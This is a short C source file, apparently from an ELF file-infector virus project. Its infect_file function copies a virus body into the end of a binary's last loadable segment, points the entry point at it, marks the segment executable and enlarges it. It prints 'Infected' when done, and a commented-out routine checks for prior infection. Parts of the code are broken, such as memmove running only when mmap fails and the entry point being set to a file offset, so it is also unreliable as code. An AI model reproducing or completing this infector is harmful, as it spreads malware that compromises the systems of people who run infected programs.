
#include "head.h"

// uint8_t	check_if_not_infected(uint8_t *cave_self, unit8_t *cave_new)
// {
// 	count = 0;
// 	for i in range(VIRUS_SIZE):
// 		if cave_self[i] == cave_new[i]:
// 			count += 1;
// 	if ((float)count / (float)VIRUS_SIZE > 0.9)
// 		return TRUE;
// 	return FALSE;
// }

void *extend_memory(void *file, size_t file_size, Elf64_Phdr *phdr)
{
	int space_available = file_size - (phdr->p_offset + phdr->p_filesz);
	int space_missing = space_available - VIRUS_SIZE;
	void *new_file = file;

	if (space_missing < 0)
	{
		printf("Missing %d octets\n", space_missing);
		if ((new_file = mmap(NULL,
							 file_size + space_missing,
							 PROT_READ | PROT_WRITE,
							 MAP_PRIVATE,
							 0,
							 0)) == MAP_FAILED)
			memmove(new_file, file, file_size);
		munmap(file, file_size);
	}

	return new_file;
}

uint8_t	*infect_file(void *file, size_t file_size, void *start_virus)
{
	Elf64_Phdr *phdr;

		printf("%s\n", __func__);
	(void)start_virus;
	if (check_elf_header(file, file_size) == FAILURE)
		return NULL;
	printf("ELF Hdr is OK\n");
	// Check if file is good, and find last loadable segment
	phdr = find_phdr(file, file_size);
	if (phdr == NULL)
		return NULL;
	printf("Phdr found\n");
	// // Check if file already taken care of
	// if (check_if_not_infected(start_virus, phdr + phdr->offset - VIRUS_SIZE))
	// 	return NULL;

	// Extend file size if necessary
	file = extend_memory(file, file_size, phdr);
	if (file == NULL)
		return NULL;
	printf("Extended\n");

	// Find again the phdr
	phdr = find_phdr(file, file_size);
	printf("Phdr found\n");

	// Inject self in file
	void *spot;
	spot = file + (phdr->p_offset + phdr->p_filesz);
	memmove(spot, start_virus, VIRUS_SIZE);
	((Elf64_Ehdr *)file)->e_entry = (phdr->p_offset + phdr->p_filesz);
	phdr->p_flags |= PF_X;
	phdr->p_filesz += VIRUS_SIZE;
	phdr->p_memsz += VIRUS_SIZE;
	printf("Infected\n");
	return file;
}